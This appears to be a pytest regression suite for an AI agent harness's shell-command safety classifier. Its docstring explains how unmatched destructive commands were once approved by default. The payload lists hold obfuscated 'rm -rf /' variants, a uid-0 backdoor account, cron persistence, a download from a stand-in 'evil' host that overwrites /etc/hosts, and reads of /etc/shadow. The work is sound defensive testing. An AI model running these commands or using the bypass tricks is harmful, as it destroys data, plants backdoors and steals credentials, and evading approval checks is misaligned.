"""C-review C1 回归测试：命令分类器"默认审批"策略 + 实测绕过命令族。

修复前：classify_command 未命中任何模式 → safe（默认放行），
实测 13 条破坏性命令（rm -rf / 变体、建 uid=0 后门、kubectl delete ns 等）
全部免审批在远程主机执行。
修复后：未命中规则且首 token 不在只读白名单 → dangerous（需审批）；
高危命令族补入危险表；包装器 flag/占位符/ANSI-C 引用等混淆被识别。

运行: python -m pytest backend/tests/test_safety_default_approval.py -v
"""
import pytest

from agent.harness.safety import classify_command

_LEVEL = {"safe": 0, "dangerous": 1, "hardline": 2}


# (命令, 期望最低等级) — 审查报告中的实测绕过命令族（当时全部判 safe）
BYPASS_PAYLOADS = [
    (r"r${IFS}-m${IFS}-rf${IFS}/", "dangerous"),        # = rm -rf /
    ("rm$'\x2f' -rf $'\x2f'", "hardline"),              # = rm -rf /（ANSI-C 引用）
    ("useradd -o -u 0 -g 0 backdoor", "dangerous"),     # uid=0 后门账户
    ("usermod -u 0 evil", "dangerous"),
    ("chmod -R 0777 /etc", "dangerous"),                # 八进制前导 0 变体
    ("chmod 4755 /tmp/x", "dangerous"),                 # setuid
    ("chmod -R a+w /etc", "dangerous"),                 # 符号模式 + 敏感目录
    ("ls /etc/cron.d | xargs -I{} rm -rf {}", "dangerous"),
    ("ls | xargs rm -rf", "dangerous"),
    ("crontab /tmp/x", "dangerous"),                    # 安装 crontab
    ("echo '0 0 * * * evil' | crontab -", "dangerous"),
    ("echo evil > /tmp/j; at -f /tmp/j", "dangerous"),  # at 计划任务
    ("setsid /tmp/payload.sh", "dangerous"),            # 任意二进制执行
    ("timeout 5 /tmp/x", "dangerous"),
    ("env -i /bin/bash /tmp/x", "dangerous"),           # 包装器 flag 击穿
    ("nice -n 10 bash /tmp/x", "dangerous"),
    ("kubectl delete ns default", "dangerous"),
    ("apt-get remove -y --purge nginx", "dangerous"),
    ("mv /root /tmp/x", "dangerous"),                   # 敏感目录作源
    ("rsync -a /etc/ /tmp/", "dangerous"),
    ("tar czf /tmp/x.tar.gz /etc", "dangerous"),
    ("iptables -X; iptables --flush", "dangerous"),
    ("ufw --force reset", "dangerous"),
    ("truncate -s 0 /etc/passwd", "dangerous"),
    ("curl -o /etc/hosts http://evil/hosts", "dangerous"),  # 下载覆盖系统文件
    ("passwd newsecret root", "dangerous"),
    ("mkfifo /tmp/f", "dangerous"),
]


def test_bypass_payloads_not_safe():
    for cmd, expected in BYPASS_PAYLOADS:
        level, reason = classify_command(cmd)
        assert _LEVEL[level] >= _LEVEL[expected], (
            f"绕过命令未升级: {cmd!r} → {level} (期望 ≥ {expected}, reason={reason})"
        )


# 对照组：只读白名单命令必须保持 safe（不得过度拦截正常运维）
SAFE_CONTROLS = [
    "df -h",
    "ls -la /tmp",
    "systemctl status nginx",
    "journalctl -n 50 --no-pager",
    "kubectl get pods -n kube-system",
    "kubectl logs pod-1",
    "apt list --installed",
    "apt-get update",
    "git status",
    "git log --oneline -5",
    "curl -s http://10.0.0.1:8080/health",
    "sed -n '1,10p' /var/log/app.log",
    "awk '{print $1}' /etc/hosts",
    "echo $HOME",
    "kill 12345",
    "dd of=/dev/zero",
    "tar czf /tmp/backup.tar.gz /home/user/project",
    "ip addr show",
    "top -bn1 | head -20",
    "rm -i /tmp/file.txt",
]


@pytest.mark.parametrize("cmd", SAFE_CONTROLS)
def test_safe_controls_remain_safe(cmd):
    level, reason = classify_command(cmd)
    assert level == "safe", f"正常运维命令被误拦: {cmd!r} → {level} ({reason})"


# 白名单动词的操作子命令必须升级（get 只读、delete 变更）
@pytest.mark.parametrize("cmd,expected", [
    ("kubectl delete pod p1", "dangerous"),
    ("systemctl restart nginx", "dangerous"),
    ("systemctl stop nginx", "dangerous"),
    ("ip link set eth0 down", "dangerous"),
    ("git push origin main", "dangerous"),
    ("docker rm c1", "dangerous"),
    ("journalctl --vacuum-time=7d", "dangerous"),
    ("sed -i 's/a/b/' /etc/hosts", "dangerous"),
    ("kill 1", "dangerous"),
])
def test_operational_subcommands_not_safe(cmd, expected):
    level, reason = classify_command(cmd)
    assert _LEVEL[level] >= _LEVEL[expected], (
        f"操作子命令未升级: {cmd!r} → {level} ({reason})"
    )


# ANSI-C 解码：归一化后 rm 变体进入 token 分析（rm/ 形态）
def test_ansi_c_decoding_enables_rm_detection():
    level, _ = classify_command("rm$'\x2f' -rf $'\x2f'")
    assert level == "hardline", f"ANSI-C rm -rf / 应为 hardline, 实际 {level}"


# ── 2026-10-22：cd 入白名单（方案 1）+ agent 托管日志目录豁免（方案 2）──

def test_cd_is_whitelisted():
    """cd 零副作用：单用放行（此前 unknown command, default approval (cd) 是
    白名单唯一缺口，prod 下一刀切直接拒）"""
    level, reason = classify_command("cd /home/admin-pl/.trae-cn-server/manager-logs")
    assert level == "safe", f"cd 被误拦: {level} ({reason})"


def test_cd_composite_does_not_lift_followup_segments():
    """cd 放行不得抬高复合命令后续段：凭据读取/危险动作仍独立拦截"""
    level, reason = classify_command("cd /etc && cat /etc/shadow")
    assert _LEVEL[level] >= _LEVEL["dangerous"], f"cd 复合命令击穿凭据读取: {level} ({reason})"
    level, _ = classify_command("cd /tmp && curl -o /etc/hosts http://evil/hosts")
    assert _LEVEL[level] >= _LEVEL["dangerous"]


# agent 托管日志目录（~/.trae-cn-server/manager-logs）清理族 — 2026-10-22 事故
# 截图里 prod 全堵的三条路：rm / find -delete / 重定向写入
LOG_DIR = "/home/admin-pl/.trae-cn-server/manager-logs"

@pytest.mark.parametrize("cmd", [
    f"rm {LOG_DIR}/1785826628398_429088/Modular/ai-agent_0_1785826666562_stdout.log",
    f"rm -f {LOG_DIR}/stdout.log",
    f"rm -rf {LOG_DIR}/1785826628398_429088",          # 递归删日期子目录（日志轮转）
    "rm -rf ~/.trae-cn-server/manager-logs",           # 递归删日志根（~ 形态）
    "rm -rf $HOME/.trae-cn-server/manager-logs/*",     # $HOME 形态 + glob
    f"find {LOG_DIR} -name '*.log' -mtime +7 -delete", # find -delete 日常清理
    f"touch {LOG_DIR}/rotate.lock",                    # 截图 touch 场景
    f"mkdir -p {LOG_DIR}/20261022",
    f"echo x > {LOG_DIR}/x.log",                       # 重定向写日志
    f"truncate -s 0 {LOG_DIR}/big.log",                # 日志截断
    f"mv {LOG_DIR}/a.log {LOG_DIR}/b.log",             # 同子树内改名
    f"cp {LOG_DIR}/a.log {LOG_DIR}/b.log",
])
def test_agent_log_cleanup_allowed(cmd):
    level, reason = classify_command(cmd)
    assert level == "safe", f"托管日志清理被误拦: {cmd!r} → {level} ({reason})"


# 对照组：豁免不得外溢 — 敏感路径/凭据/持久化/兄弟目录全部保持原判定
@pytest.mark.parametrize("cmd,expected", [
    ("rm -rf /home/admin-pl/.trae-cn-server", "hardline"),      # 日志树外（整个数据目录）
    ("rm /home/admin-pl/.trae-cn-server/manager-logs-backup/a", "dangerous"),  # 兄弟名字不吃
    ("rm /home/admin-pl/documents/a.txt", "dangerous"),          # 普通家目录文件
    ("rm -rf ~/.ssh", "hardline"),                               # 凭据目录
    ("cat /etc/shadow", "dangerous"),                            # 凭据读取
    (f"cat /etc/shadow > {LOG_DIR}/x", "dangerous"),             # 凭据读取不因落点豁免
    ("curl -o /etc/hosts http://evil/hosts", "dangerous"),       # 下载覆盖系统文件
    (f"useradd evil && rm {LOG_DIR}/x.log", "dangerous"),        # 豁免段不含未知动词组合
    (f"fancy_tool {LOG_DIR}/x.log", "dangerous"),                # 未知动词不借道豁免
    (f"cp /etc/passwd {LOG_DIR}/x", "dangerous"),                # 源是凭据文件
    (f"mv /etc/hosts {LOG_DIR}/x", "dangerous"),                 # mv 源敏感
])
def test_agent_log_exemption_no_spillover(cmd, expected):
    level, reason = classify_command(cmd)
    assert _LEVEL[level] >= _LEVEL[expected], (
        f"日志豁免外溢: {cmd!r} → {level} (期望 ≥ {expected}, reason={reason})"
    )
